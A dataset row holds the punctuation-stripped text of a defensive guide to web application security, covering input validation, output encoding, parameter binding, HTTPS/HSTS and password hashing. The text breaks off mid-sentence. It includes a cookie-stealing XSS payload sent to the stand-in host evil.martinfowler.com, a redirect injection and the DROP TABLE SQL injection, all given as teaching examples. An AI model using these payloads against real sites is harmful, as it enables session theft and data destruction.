X1,file_name,category,text,recommendations
28,training-dataset/engineering/656.txt,engineering,The Basics of Web Application SecurityModern web development has many challenges  and of those security is both very important and often under emphasized  While such techniques as threat analysis are increasingly recognized as essential to any serious development  there are also some basic practices which every developer can and should be doing as a matter of course   Daniel Somerfield is a Technical Lead at ThoughtWorks  where he works with customers building systems that serve their business needs and are fast  flexible  and secure  Daniel is an advocate for immutable infrastructure and cloud automation as a vehicle to advance the state of secure agile delivery at ThoughtWorks and in the industry at large   Cade Cairns is a software developer with a passion for security  He has experience leading teams creating everything from enterprise applications to security testing software  mobile applications  and software for embedded devices  At the moment his primary focus is on helping improve how security concerns are addressed during the solution delivery lifecycle   The modern software developer has to be something of a swiss army knife  Of course  you need to write code that fulfills customer functional requirements  It needs to be fast  Further you are expected to write this code to be comprehensible and extensible  sufficiently flexible to allow for the evolutionary nature of IT demands  but stable and reliable  You need to be able to lay out a useable interface  optimize a database  and often set up and maintain a delivery pipeline  You need to be able to get these things done by yesterday   Somewhere  way down at the bottom of the list of requirements  behind  fast  cheap  and flexible is  secure   That is  until something goes wrong  until the system you build is compromised  then suddenly security is  and always was  the most important thing   Security is a cross functional concern a bit like Performance  And a bit unlike Performance  Like Performance  our business owners often know they need Security  but aren t always sure how to quantify it  Unlike Performance  they often don t know  secure enough  when they see it   So how can a developer work in a world of vague security requirements and unknown threats  Advocating for defining those requirements and identifying those threats is a worthy exercise  but one that takes time and therefore money  Much of the time developers will operate in absence of specific security requirements and while their organization grapples with finding ways to introduce security concerns into the requirements intake processes  they will still build systems and write code   In this Evolving Publication  we will   point out common areas in a web application that developers need to be particularly conscious of security risks  provide guidance for how to address each risk on common web stacks  highlight common mistakes developers make  and how to avoid them  Security is a massive topic  even if we reduce the scope to only browser based web applications  These articles will be closer to a  best of  than a comprehensive catalog of everything you need to know  but we hope it will provide a directed first step for developers who are trying to ramp up fast   Trust Before jumping into the nuts and bolts of input and output  it s worth mentioning one of the most crucial underlying principles of security  trust  We have to ask ourselves  do we trust the integrity of request coming in from the user s browser   hint  we don t   Do we trust that upstream services have done the work to make our data clean and safe   hint  nope   Do we trust the connection between the user s browser and our application cannot be tampered   hint  not completely      Do we trust that the services and data stores we depend on   hint  we might     Of course  like security  trust is not binary  and we need to assess our risk tolerance  the criticality of our data  and how much we need to invest to feel comfortable with how we have managed our risk  In order to do that in a disciplined way  we probably need to go through threat and risk modeling processes  but that s a complicated topic to be addressed in another article  For now  suffice it to say that we will identify a series of risks to our system  and now that they are identified  we will have to address the threats that arise   Reject Unexpected Form Input HTML forms can create the illusion of controlling input  The form markup author might believe that because they are restricting the types of values that a user can enter in the form the data will conform to those restrictions  But rest assured  it is no more than an illusion  Even client side JavaScript form validation provides absolutely no value from a security perspective  Untrusted Input On our scale of trust  data coming from the user s browser  whether we are providing the form or not  and regardless of whether the connection is HTTPS protected  is effectively zero  The user could very easily modify the markup before sending it  or use a command line application like curl to submit unexpected data  Or a perfectly innocent user could be unwittingly submitting a modified version of a form from a hostile website  Same Origin Policy doesn t prevent a hostile site from submitting to your form handling endpoint  In order to ensure the integrity of incoming data  validation needs to be handled on the server  But why is malformed data a security concern  Depending on your application logic and use of output encoding  you are inviting the possibility of unexpected behavior  leaking data  and even providing an attacker with a way of breaking the boundaries of input data into executable code  For example  imagine that we have a form with a radio button that allows the user to select a communication preference  Our form handling code has application logic with different behavior depending on those values  final String communicationType   req getParameter  communicationType    if   email  equals communicationType     sendByEmail      else if   text  equals communicationType     sendByText      else   sendError resp  format  Can t send by type  s   communicationType      This code may or may not be dangerous  depending on how the sendError method is implemented  We are trusting that downstream logic processes untrusted content correctly  It might  But it might not  We re much better off if we can eliminate the possibility of unanticipated control flow entirely  So what can a developer do to minimize the danger that untrusted input will have undesirable effects in application code  Enter input validation  Input Validation Input validation is the process of ensuring input data is consistent with application expectations  Data that falls outside of an expected set of values can cause our application to yield unexpected results  for example violating business logic  triggering faults  and even allowing an attacker to take control of resources or the application itself  Input that is evaluated on the server as executable code  such as a database query  or executed on the client as HTML JavaScript is particularly dangerous  Validating input is an important first line of defense to protect against this risk  Developers often build applications with at least some basic input validation  for example to ensure a value is non null or an integer is positive  Thinking about how to further limit input to only logically acceptable values is the next step toward reducing risk of attack  Input validation is more effective for inputs that can be restricted to a small set  Numeric types can typically be restricted to values within a specific range  For example  it doesn t make sense for a user to request to transfer a negative amount of money or to add several thousand items to their shopping cart  This strategy of limiting input to known acceptable types is known as positive validation or whitelisting  A whitelist could restrict to a string of a specific form such as a URL or a date of the form  yyyy mm dd   It could limit input length  a single acceptable character encoding  or  for the example above  only values that are available in your form  Another way of thinking of input validation is that it is enforcement of the contract your form handling code has with its consumer  Anything violating that contract is invalid and therefore rejected  The more restrictive your contract  the more aggressively it is enforced  the less likely your application is to fall prey to security vulnerabilities that arise from unanticipated conditions  You are going to have to make a choice about exactly what to do when input fails validation  The most restrictive and  arguably most desirable is to reject it entirely  without feedback  and make sure the incident is noted through logging or monitoring  But why without feedback  Should we provide our user with information about why the data is invalid  It depends a bit on your contract  In form example above  if you receive any value other than  email  or  text   something funny is going on  you either have a bug or you are being attacked  Further  the feedback mechanism might provide the point of attack  Imagine the sendError method writes the text back to the screen as an error message like  We re unable to respond with communicationType    That s all fine if the communicationType is  carrier pigeon  but what happens if it looks like this   script new Image   src    http   evil martinfowler com steal     document cookie  script  You ve now faced with the possibility of a reflective XSS attack that steals session cookies  If you must provide user feedback  you are best served with a canned response that doesn t echo back untrusted user data  for example  You must choose email or text   If you really can t avoid rendering the user s input back at them  make absolutely sure it s properly encoded  see below for details on output encoding   In Practice It might be tempting to try filtering the  script  tag to thwart this attack  Rejecting input that contains known dangerous values is a strategy referred to as negative validation or blacklisting  The trouble with this approach is that the number of possible bad inputs is extremely large  Maintaining a complete list of potentially dangerous input would be a costly and time consuming endeavor  It would also need to be continually maintained  But sometimes it s your only option  for example in cases of free form input  If you must blacklist  be very careful to cover all your cases  write good tests  be as restrictive as you can  and reference OWASP s XSS Filter Evasion Cheat Sheet to learn common methods attackers will use to circumvent your protections  Resist the temptation to filter out invalid input  This is a practice commonly called  sanitization   It is essentially a blacklist that removes undesirable input rather than rejecting it  Like other blacklists  it is hard to get right and provides the attacker with more opportunities to evade it  For example  imagine  in the case above  you choose to filter out  script  tags  An attacker could bypass it with something as simple as   scr script ipt  Even though your blacklist caught the attack  by fixing it  you just reintroduced the vulnerability  Input validation functionality is built in to most modern frameworks and  when absent  can also be found in external libraries that enable the developer to put multiple constraints to be applied as rules on a per field basis  Built in validation of common patterns like email addresses and credit card numbers is a helpful bonus  Using your web framework s validation provides the additional advantage of pushing the validation logic to the very edge of the web tier  causing invalid data to be rejected before it ever reaches complex application code where critical mistakes are easier to make  Framework Approaches Java Hibernate  Bean Validation  ESAPI Spring Built in type safe params in Controller Built in Validator interface  Bean Validation  Ruby on Rails Built in Active Record Validators ASP NET Built in Validation  see BaseValidator  Play Built in Validator Generic JavaScript xss filters NodeJS validator js General Regex based validation on application inputs In Summary White list when you can  Black list when you can t whitelist  Keep your contract as restrictive as possible  Make sure you alert about the possible attack  Avoid reflecting input back to a user  Reject the web content before it gets deeper into application logic to minimize ways to mishandle untrusted data or  even better  use your web framework to whitelist input Although this section focused on using input validation as a mechanism for protecting your form handling code  any code that handles input from an untrusted source can be validated in much the same way  whether the message is JSON  XML  or any other format  and regardless of whether it s a cookie  a header  or URL parameter string  Remember  if you don t control it  you can t trust it  If it violates the contract  reject it   Encode HTML Output In addition to limiting data coming into an application  web application developers need to pay close attention to the data as it comes out  A modern web application usually has basic HTML markup for document structure  CSS for document style  JavaScript for application logic  and user generated content which can be any of these things  It s all text  And it s often all rendered to the same document  An HTML document is really a collection of nested execution contexts separated by tags  like  script  or  style    The developer is always one errant angle bracket away from running in a very different execution context than they intend  This is further complicated when you have additional context specific content embedded within an execution context  For example  both HTML and JavaScript can contain a URL  each with rules all their own  Output Risks HTML is a very  very permissive format  Browsers try their best to render the content  even if it is malformed  That may seem beneficial to the developer since a bad bracket doesn t just explode in an error  however  the rendering of badly formed markup is a major source of vulnerabilities  Attackers have the luxury of injecting content into your pages to break through execution contexts  without even having to worry about whether the page is valid  Handling output correctly isn t strictly a security concern  Applications rendering data from sources like databases and upstream services need to ensure that the content doesn t break the application  but risk becomes particularly high when rendering content from an untrusted source  As mentioned in the prior section  developers should be rejecting input that falls outside the bounds of the contract  but what do we do when we need to accept input containing characters that has the potential to change our code  like a single quote         or open bracket          This is where output encoding comes in  Output Encoding Output encoding is converting outgoing data to a final output format  The complication with output encoding is that you need a different codec depending on how the outgoing data is going to be consumed  Without appropriate output encoding  an application could provide its client with misformatted data making it unusable  or even worse  dangerous  An attacker who stumbles across insufficient or inappropriate encoding knows that they have a potential vulnerability that might allow them to fundamentally alter the structure of the output from the intent of the developer  For example  imagine that one of the first customers of a system is the former supreme court judge Sandra Day O Connor  What happens if her name is rendered into HTML   p The Honorable Justice Sandra Day O Connor  p  renders as  The Honorable Justice Sandra Day O Connor All is right with the world  The page is generated as we would expect  But this could be a fancy dynamic UI with a model view controller architecture  These strings are going to show up in JavaScript  too  What happens when the page outputs this to the browser  document getElementById  name   innerText    Sandra Day O Connor       unescaped string The result is malformed JavaScript  This is what hackers look for to break through execution context and turn innocent data into dangerous executable code  If the Chief Justice enters her name as Sandra Day O  window location  http   evil martinfowler com    suddenly our user has been pushed to a hostile site  If  however  we correctly encode the output for a JavaScript context  the text will look like this   Sandra Day O   window location   http   evil martinfowler com      A bit confusing  perhaps  but a perfectly harmless  non executable string  Note There are a couple strategies for encoding JavaScript  This particular encoding uses escape sequences to represent the apostrophe           but it could also be represented safely with the Unicode escape seqeence          The good news is that most modern web frameworks have mechanisms for rendering content safely and escaping reserved characters  The bad news is that most of these frameworks include a mechanism for circumventing this protection and developers often use them either due to ignorance or because they are relying on them to render executable code that they believe to be safe  Cautions and Caveats There are so many tools and frameworks these days  and so many encoding contexts  e g  HTML  XML  JavaScript  PDF  CSS  SQL  etc    that creating a comprehensive list is infeasible  however  below is a starter for what to use and avoid for encoding HTML in some common frameworks  If you are using another framework  check the documentation for safe output encoding functions  If the framework doesn t have them  consider changing frameworks to something that does  or you ll have the unenviable task of creating output encoding code on your own  Also note  that just because a framework renders HTML safely  doesn t mean it s going to render JavaScript or PDFs safely  You need to be aware of the encoding a particular context the encoding tool is written for  Be warned  you might be tempted to take the raw user input  and do the encoding before storing it  This pattern will generally bite you later on  If you were to encode the text as HTML prior to storage  you can run into problems if you need to render the data in another format  it can force you to unencode the HTML  and re encode into the new output format  This adds a great deal of complexity and encourages developers to write code in their application code to unescape the content  making all the tricky upstream output encoding effectively useless  You are much better off storing the data in its most raw form  then handling encoding at rendering time  Finally  it s worth noting that nested rendering contexts add an enormous amount of complexity and should be avoided whenever possible  It s hard enough to get a single output string right  but when you are rendering a URL  in HTML within JavaScript  you have three contexts to worry about for a single string  If you absolutely cannot avoid nested contexts  make sure to de compose the problem into separate stages  thoroughly test each one  paying special attention to order of rendering  OWASP provides some guidance for this situation in the DOM based XSS Prevention Cheat Sheet In Summary Output encode all application data on output with an appropriate codec  Use your framework s output encoding capability  if available  Avoid nested rendering contexts as much as possible  Store your data in raw form and encode at rendering time  Avoid unsafe framework and JavaScript calls that avoid encoding  Bind Parameters for Database Queries Whether you are writing SQL against a relational database  using an object relational mapping framework  or querying a NoSQL database  you probably need to worry about how input data is used within your queries  The database is often the most crucial part of any web application since it contains state that can t be easily restored  It can contain crucial and sensitive customer information that must be protected  It is the data that drives the application and runs the business  So you would expect developers to take the most care when interacting with their database  and yet injection into the database tier continues to plague the modern web application even though it s relatively easy to prevent  Little Bobby Tables No discussion of parameter binding would be complete without including the famous 2007  Little Bobby Tables  issue of xkcd  To decompose this comic  imagine the system responsible for keeping track of grades has a function for adding new students  void addStudent String lastName  String firstName    String query    INSERT INTO students  last_name  first_name  VALUES       lastName            firstName         getConnection   createStatement   execute query     If addStudent is called with parameters  Fowler    Martin   the resulting SQL is  INSERT INTO students  last_name  first_name  VALUES   Fowler    Martin   But with Little Bobby s name the following SQL is executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert    DROP TABLE Students       In fact  two commands are executed  INSERT INTO students  last_name  first_name  VALUES   XKCD    Robert   DROP TABLE Students The final      comments out the remainder of the original query  ensuring the SQL syntax is valid  Et voila  the DROP is executed  This attack vector allows the user to execute arbitrary SQL within the context of the application s database user  In other words  the attacker can do anything the application can do and more  which could result in attacks that cause greater harm than a DROP  including violating data integrity  exposing sensitive information or inserting executable code  Later we will talk about defining different users as a secondary defense against this kind of mistake  but for now  suffice to say that there is a very simple application level strategy for minimizing injection risk  Parameter Binding to the Rescue To quibble with Hacker Mom s solution  sanitizing is very difficult to get right  creates new potential attack vectors and is certainly not the right approach  Your best  and arguably only decent option is parameter binding  JDBC  for example  provides the PreparedStatement setXXX   methods for this very purpose  Parameter binding provides a means of separating executable code  such as SQL  from content  transparently handling content encoding and escaping  void addStudent String lastName  String firstName    PreparedStatement stmt   getConnection   prepareStatement  INSERT INTO students  last_name  first_name  VALUES           stmt setString 1  lastName   stmt setString 2  firstName   stmt execute      Any full featured data access layer will have the ability to bind variables and defer implementation to the underlying protocol  This way  the developer doesn t need to understand the complexities that arise from mixing user input with executable code  For this to be effective all untrusted inputs need to be bound  If SQL is built through concatenation  interpolation  or formatting methods  none of the resulting string should be created from user input  Clean and Safe Code Sometimes we encounter situations where there is tension between good security and clean code  Security sometimes requires the programmer to add some complexity in order to protect the application  In this case however  we have one of those fortuitous situations where good security and good design are aligned  In addition to protecting the application from injection  introducing bound parameters improves comprehensibility by providing clear boundaries between code and content  and simplifies creating valid SQL by eliminating the need to manage the quotes by hand  As you introduce parameter binding to replace your string formatting or concatenation  you may also find opportunities to introduce generalized binding functions to the code  further enhancing code cleanliness and security  This highlights another place where good design and good security overlap  de duplication leads to additional testability  and reduction of complexity  Common Misconceptions There is a misconception that stored procedures prevent SQL injection  but that is only true insofar as parameters are bound inside the stored procedure  If the stored procedure itself does string concatenation it can be injectable as well  and binding the variable from the client won t save you  Similarly  object relational mapping frameworks like ActiveRecord  Hibernate  or  NET Entity Framework  won t protect you unless you are using binding functions  If you are building your queries using untrusted input without binding  the app still could be vulnerable to an injection attack  For more detail on the injection risks of stored procedures and ORMs  see security analyst Troy Hunt s article Stored procedures and ORMs won t save you from SQL injection   Finally  there is a misconception that NoSQL databases are not susceptible to injection attack and that is not true  All query languages  SQL or otherwise  require a clear separation between executable code and content so the execution doesn t confuse the command from the parameter  Attackers look for points in the runtime where they can break through those boundaries and use input data to change the intended execution path  Even Mongo DB  which uses a binary wire protocol and language specific API  reducing opportunities for text based injection attacks  exposes the   where  operator which is vulnerable to injection  as is demonstrated in this article from the OWASP Testing Guide  The bottom line is that you need to check the data store and driver documentation for safe ways to handle input data  Parameter Binding Functions Check the matrix below for indication of safe binding functions of your chosen data store  If it is not included in this list  check the product documentation  Framework Encoded Dangerous Raw JDBC Connection prepareStatement   used with setXXX   methods and bound parameters for all input  Any query or update method called with string concatenation rather than binding  PHP   MySQLi prepare   used with bind_param for all input  Any query or update method called with string concatenation rather than binding  MongoDB Basic CRUD operations such as find    insert    with BSON document field names controlled by application  Operations  including find  when field names are allowed to be determined by untrusted data or use of Mongo operations such as   where  that allow arbitrary JavaScript conditions  Cassandra Session prepare used with BoundStatement and bound parameters for all input  Any query or update method called with string concatenation rather than binding  Hibernate   JPA Use SQL or JPQL OQL with bound parameters via setParameter Any query or update method called with string concatenation rather than binding  ActiveRecord Condition functions  find_by  where  if used with hashes or bound parameters  eg  where  foo  bar  where   foo       bar  Condition functions used with string concatenation or interpolation  where  foo      bar     where  foo        bar        In Summary Avoid building SQL  or NoSQL equivalent  from user input  Bind all parameterized data  both queries and stored procedures  Use the native driver binding function rather than trying to handle the encoding yourself  Don t think stored procedures or ORM tools will save you  You need to use binding functions for those  too  NoSQL doesn t make you injection proof  Protect Data in Transit While we re on the subject of input and output  there s another important consideration  the privacy and integrity of data in transit  When using an ordinary HTTP connection  users are exposed to many risks arising from the fact data is transmitted in plaintext  An attacker capable of intercepting network traffic anywhere between a user s browser and a server can eavesdrop or even tamper with the data completely undetected in a man in the middle attack  There is no limit to what the attacker can do  including stealing the user s session or their personal information  injecting malicious code that will be executed by the browser in the context of the website  or altering data the user is sending to the server  We can t usually control the network our users choose to use  They very well might be using a network where anyone can easily watch their traffic  such as an open wireless network in a caf  or on an airplane  They might have unsuspectingly connected to a hostile wireless network with a name like  Free Wi Fi  set up by an attacker in a public place  They might be using an internet provider that injects content such as ads into their web traffic  or they might even be in a country where the government routinely surveils its citizens  If an attacker can eavesdrop on a user or tamper with web traffic  all bets are off  The data exchanged cannot be trusted by either side  Fortunately for us  we can protect against many of these risks with HTTPS  HTTPS and Transport Layer Security HTTPS was originally used mainly to secure sensitive web traffic such as financial transactions  but it is now common to see it used by default on many sites we use in our day to day lives such as social networking and search engines  The HTTPS protocol uses the Transport Layer Security  TLS  protocol  the successor to the Secure Sockets Layer  SSL  protocol  to secure communications  When configured and used correctly  it provides protection against eavesdropping and tampering  along with a reasonable guarantee that a website is the one we intend to be using  Or  in more technical terms  it provides confidentiality and data integrity  along with authentication of the website s identity  With the many risks we all face  it increasingly makes sense to treat all network traffic as sensitive and encrypt it  When dealing with web traffic  this is done using HTTPS  Several browser makers have announced their intent to deprecate non secure HTTP and even display visual indications to users to warn them when a site is not using HTTPS  Most HTTP 2 implementations in browsers will only support communicating over TLS  So why aren t we using it for everything now  There have been some hurdles that impeded adoption of HTTPS  For a long time  it was perceived as being too computationally expensive to use for all traffic  but with modern hardware that has not been the case for some time  The SSL protocol and early versions of the TLS protocol only support the use of one web site certificate per IP address  but that restriction was lifted in TLS with the introduction of a protocol extension called SNI  Server Name Indication   which is now supported in most browsers  The cost of obtaining a certificate from a certificate authority also deterred adoption  but the introduction of free services like Let s Encrypt has eliminated that barrier  Today there are fewer hurdles than ever before  Get a Server Certificate The ability to authenticate the identity of a website underpins the security of TLS  In the absence of the ability to verify that a site is who it says it is  an attacker capable of doing a man in the middle attack could impersonate the site and undermine any other protection the protocol provides  When using TLS  a site proves its identity using a public key certificate  This certificate contains information about the site along with a public key that is used to prove that the site is the owner of the certificate  which it does using a corresponding private key that only it knows  In some systems a client may also be required to use a certificate to prove its identity  although this is relatively rare in practice today due to complexities in managing certificates for clients  Unless the certificate for a site is known in advance  a client needs some way to verify that the certificate can be trusted  This is done based on a model of trust  In web browsers and many other applications  a trusted third party called a Certificate Authority  CA  is relied upon to verify the identity of a site and sometimes of the organization that owns it  then grant a signed certificate to the site to certify it has been verified  It isn t always necessary to involve a trusted third party if the certificate is known in advance by sharing it through some other channel  For example  a mobile app or other application might be distributed with a certificate or information about a custom CA that will be used to verify the identity of the site  This practice is referred to as certificate or public key pinning and is outside the scope of this article  The most visible indicator of security that many web browsers display is when communications with a site are secured using HTTPS and the certificate is trusted  Without it  a browser will display a warning about the certificate and prevent a user from viewing your site  so it is important to get a certificate from a trusted CA  It is possible to generate your own certificate to test a HTTPS configuration out  but you will need a certificate signed by a trusted CA before exposing the service to users  For many uses  a free CA is a good starting point  When searching for a CA  you will encounter different levels of certification offered  The most basic  Domain Validation  DV   certifies the owner of the certificate controls a domain  More costly options are Organization Validation  OV  and Extended Validation  EV   which involve the CA doing additional checks to verify the organization requesting the certificate  Although the more advanced options result in a more positive visual indicator of security in the browser  it may not be worth the extra cost for many  Configure Your Server With a certificate in hand  you can begin to configure your server to support HTTPS  At first glance  this may seem like a task worthy of someone who holds a PhD in cryptography  You may want to choose a configuration that supports a wide range of browser versions  but you need to balance that with providing a high level of security and maintaining some level of performance  The cryptographic algorithms and protocol versions supported by a site have a strong impact on the level of communications security it provides  Attacks with impressive sounding names like FREAK and DROWN and POODLE  admittedly  the last one doesn t sound all that formidable  have shown us that supporting dated protocol versions and algorithms presents a risk of browsers being tricked into using the weakest option supported by a server  making attack much easier  Advancements in computing power and our understanding of the mathematics underlying algorithms also renders them less safe over time  How can we balance staying up to date with making sure our website remains compatible for a broad assortment of users who might be using dated browsers that only support older protocol versions and algorithms  Fortunately  there are tools that help make the job of selection a lot easier  Mozilla has a helpful SSL Configuration Generator to generate recommended configurations for various web servers  along with a complementary Server Side TLS Guide with more in depth details  Note that the configuration generator mentioned above enables a browser security feature called HSTS by default  which might cause problems until you re ready to commit to using HTTPS for all communications long term  We ll discuss HSTS a little later in this article  Use HTTPS for Everything It is not uncommon to encounter a website where HTTPS is used to protect only some of the resources it serves  In some cases the protection might only be extended to handling form submissions that are considered sensitive  Other times  it might only be used for resources that are considered sensitive  for example what a user might access after logging into the site  The trouble with this inconsistent approach is that anything that isn t served over HTTPS remains susceptible to the kinds of risks that were outlined earlier  For example  an attacker doing a man in the middle attack could simply alter the form mentioned above to submit sensitive data over plaintext HTTP instead  If the attacker injects executable code that will be executed in the context of our site  it isn t going to matter much that part of it is protected with HTTPS  The only way to prevent those risks is to use HTTPS for everything  The solution isn t quite as clean cut as flipping a switch and serving all resources over HTTPS  Web browsers default to using HTTP when a user enters an address into their address bar without typing  https     explicitly  As a result  simply shutting down the HTTP network port is rarely an option  Websites instead conventionally redirect requests received over HTTP to use HTTPS  which is perhaps not an ideal solution  but often the best one available  For resources that will be accessed by web browsers  adopting a policy of redirecting all HTTP requests to those resources is the first step towards using HTTPS consistently  For example  in Apache redirecting all requests to a path  in the example   content and anything beneath it  can be enabled with a few simple lines    Redirect requests to  content to use HTTPS  mod_rewrite is required  RewriteEngine On RewriteCond   HTTPS     on  NC  RewriteCond   REQUEST_URI    content       RewriteRule   https     SERVER_NAME   REQUEST_URI   R L  If your site also serves APIs over HTTP  moving to using HTTPS can require a more measured approach  Not all API clients are able to handle redirects  In this situation it is advisable to work with consumers of the API to switch to using HTTPS and to plan a cutoff date  then begin responding to HTTP requests with an error after the date is reached  Use HSTS Redirecting users from HTTP to HTTPS presents the same risks as any other request sent over ordinary HTTP  To help address this challenge  modern browsers support a powerful security feature called HSTS  HTTP Strict Transport Security   which allows a website to request that a browser only interact with it over HTTPS  It was first proposed in 2009 in response to Moxie Marlinspike s famous SSL stripping attacks  which demonstrated the dangers of serving content over HTTP  Enabling it is as simple as sending a header in a response  Strict Transport Security  max age 15768000 The above header instructs the browser to only interact with the site using HTTPS for a period of six months  specified in seconds   HSTS is an important feature to enable due to the strict policy it enforces  Once enabled  the browser will automatically convert any insecure HTTP requests to use HTTPS instead  even if a mistake is made or the user explicitly types  http     into their address bar  It also instructs the browser to disallow the user from bypassing the warning it displays if an invalid certificate is encountered when loading the site  In addition to requiring little effort to enable in the browser  enabling HSTS on the server side can require as little as a single line of configuration  For example  in Apache it is enabled by adding a Header directive within the VirtualHost configuration for port 443   VirtualHost   443        HSTS  mod_headers is required   15768000 seconds   6 months  Header always set Strict Transport Security  max age 15768000    VirtualHost  Now that you have an understanding of some of the risks inherent to ordinary HTTP  you might be scratching your head wondering what happens when the first request to a website is made over HTTP before HSTS can be enabled  To address this risk some browsers allow websites to be added to a  HSTS Preload List  that is included with the browsers  Once included in this list it will no longer be possible for the website to be accessed using HTTP  even on the first time a browser is interacting with the site  Before deciding to enable HSTS  some potential challenges must first be considered  Most browsers will refuse to load HTTP content referenced from a HTTPS resource  so it is important to update existing resources and verify all resources can be accessed using HTTPS  We don t always have control over how content can be loaded from external systems  for example from an ad network  This might require us to work with the owner of the external system to adopt HTTPS  or it might even involve temporarily setting up a proxy to serve the external content to our users over HTTPS until the external systems are updated  Once HSTS is enabled  it cannot be disabled until the period specified in the header elapses  It is advisable to make sure HTTPS is working for all content before enabling it for your site  Removing a domain from the HSTS Preload List will take even longer  The decision to add your website to the Preload List is not one that should be taken lightly  Unfortunately  not all browsers in use today support HSTS  It can not yet be counted on as a guaranteed way to enforce a strict policy for all users  so it is important to continue to redirect users from HTTP to HTTPS and employ the other protections mentioned in this article  For details on browser support for HSTS  you can visit Can I use  Protect Cookies Browsers have a built in security feature to help avoid disclosure of a cookie containing sensitive information  Setting the  secure  flag in a cookie will instruct a browser to only send a cookie when using HTTPS  This is an important safeguard to make use of even when HSTS is enabled  Other Risks There are some other risks to be mindful of that can result in accidental disclosure of sensitive information despite using HTTPS  It is dangerous to put sensitive data inside of a URL  Doing so presents a risk if the URL is cached in browser history  not to mention if it is recorded in logs on the server side  In addition  if the resource at the URL contains a link to an external site and the user clicks through  the sensitive data will be disclosed in the Referer header  In addition  sensitive data might still be cached in the client  or by intermediate proxies if the client s browser is configured to use them and allow them to inspect HTTPS traffic  For ordinary users the contents of traffic will not be visible to a proxy  but a practice we ve seen often for enterprises is to install a custom CA on their employees  systems so their threat mitigation and compliance systems can monitor traffic  Consider using headers to disable caching to reduce the risk of leaking data due to caching  For a general list of best practices  the OWASP Transport Protection Layer Cheat Sheet contains some valuable tips  Verify Your Configuration As a last step  you should verify your configuration  There is a helpful online tool for that  too  You can visit SSL Labs  SSL Server Test to perform a deep analysis of your configuration and verify that nothing is misconfigured  Since the tool is updated as new attacks are discovered and protocol updates are made  it is a good idea to run this every few months  In Summary Use HTTPS for everything   Use HSTS to enforce it  You will need a certificate from a trusted certificate authority if you plan to trust normal web browsers  Protect your private key  Use a configuration tool to help adopt a secure HTTPS configuration  Set the  secure  flag in cookies  Be mindful not to leak sensitive data in URLs  Verify your server configuration after enabling HTTPS and every few months thereafter  Hash and Salt Your Users  Passwords When developing applications  you need to do more than protect your assets from attackers  You often need to protect your users from attackers  and even from themselves  Living Dangerously The most obvious way to write password authentication is to store username and password in table and do look ups against it  Don t ever do this     SQL CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  password VARCHAR 100  NOT NULL     python def login conn  email  password   result   conn cursor   execute   SELECT   FROM application_user WHERE email_address     AND password        email  password   return result fetchone   is not None Does this work  Will it allow valid users in and keep unregistered users out  Yes  But here s why it s a very  very bad idea  The Risks Insecure password storage creates risks from both insiders and outsiders  In the former case  an insider such as an application developer or DBA who can read the above application_user table now has access to the credentials of your entire user base  One often overlooked risk is that your insiders can now impersonate your users within your application  Even if that particular scenario isn t of great concern  storing your users  credentials without appropriate cryptographic protection introduces an entirely new class of attack vectors for your user  completely unrelated to your application  We might hope it s otherwise  but the fact is that users reuse credentials  The first time someone signs up for your site of captioned cat pictures using the same email address and password that they use for their bank login  your seemingly low risk credentials database has become a vehicle for storing financial credentials  If a rogue employee or an external hacker steals your credentials data  they can use them for attempted logins to major bank sites until they find the one person who made the mistake of using their credentials with wackycatcaptions org  and one of your user s accounts is drained of funds and you are  at least in part  responsible  That leaves two choices  either store credentials safely or don t store them at all  I Can Hash Passwordz If you went down the path of creating logins for your site  option two is probably not available to you  so you are probably stuck with option one  So what is involved in safely storing credentials  Firstly  you never want to store the password itself  but rather store a hash of the password  A cryptographic hashing algorithm is a one way transformation from an input to an output from which the original input is  for all practical purposes  impossible to recover  More on that  practical purposes  phrase shortly  For example  your password might be  littlegreenjedi   Applying Argon2 with the salt  12345678   more on salts later  and default command line options  gives you the the hex result 9b83665561e7ddf91b7fd0d4873894bbd5afd4ac58ca397826e11d5fb02082a1   Now you aren t storing the password at all  but rather this hash  In order to validate a user s password  you just apply the same hash algorithm to the password text they send  and  if they match  you know the password is valid  So we re done  right  Well  not exactly  The problem now is that  assuming we don t vary the salt  every user with the password  littlegreenjedi  will have the same hash in our database  Many people just re use their same old password  Lookup tables generated using the most commonly occurring passwords and their variations can be used to efficiently reverse engineer hashed passwords  If an attacker gets hold of your password store  they can simply cross reference a lookup table with your password hashes and are statistically likely to extract a lot of credentials in a pretty short period of time  The trick is to add a bit of unpredictability into the password hashes so they cannot be easily reverse engineered  A salt  when properly generated  can provide just that  A Dash of Salt A salt is some extra data that is added to the password before it is hashed so that two instances of a given password do not have the same hash value  The real benefit here is that it increases the range of possible hashes of a given password beyond the point where it is practical to pre compute them  Suddenly the hash of  littlegreenjedi  can t be predicted anymore  If we use the salt the string  BNY0LGUZWWIZ3BVP  and then hash with Argon2 again  we get 67ddb83d85dc6f91b2e70878f333528d86674ecba1ae1c7aa5a94c7b4c6b2c52   On the other hand  if we use  M3WIBNKBYVSJW4ZJ   we get 64e7d42fb1a19bcf0dc8a3533dd3766ba2d87fd7ab75eb7acb6c737593cef14e   Now  if an attacker gets their hands on the password hash store  it is much more expensive to brute force the passwords  The salt doesn t require any special protection like encryption or obfuscation  It can live alongside the hash  or even encoded with it  as is the case with bcrypt  If your password table or file falls into attacker hands access to the salt won t help them use a lookup table to mount an attack on the collection of hashes  A salt should be globally unique per user  OWASP recommends 32 or 64 bit salt if you can manage it  and NIST requires 128 bit at a minimum  A UUID will certainly work and although probably overkill  it s generally easy to generate  if costly to store  Hashing and salting is a good start  but as we will see below  even this might not be enough  Use A Hash That s Worth Its Salt Sadly  all hashing algorithms are not created equal  SHA 1 and MD5 had been common standards for a long time until the discovery of a low cost collision attack  Luckily there are plenty of alternatives that are low collision  and slow  Yes  slow  A slower algorithm means that a brute force attack is more time consuming and therefore costlier to run  The best widely available algorithms are now considered to be scrypt and bcrypt  Because contemporary SHA algorithms and PBKDF2 are less resistant to attacks where GPUs are used  they are probably not great long term strategies  A side note  technically Argon2  scrypt  bcrypt and PBKDF2 are key derivation functions that use key stretching techniques  but for our purposes  we can think of them as a mechanism for creating a hash  Hash Algorithm Use for passwords  scrypt Yes bcrypt Yes SHA 1 No SHA 2 No MD5 No PBKDF2 No Argon2 watch  see sidebar  About Argon2 In July of 2015  Argon2 was announced as the winner of the Password Hashing Competition  Bindings are available for several languages  Argon2 was designed specifically for the purpose of hashing passwords and is resistant to attacks using GPUs and other specialized hardware  However  it is very new and has not yet been broadly adopted  although signs are good that it will be soon  Pay attention to how this adoption occurs  and when implementations become more widely available  When we feel comfortable 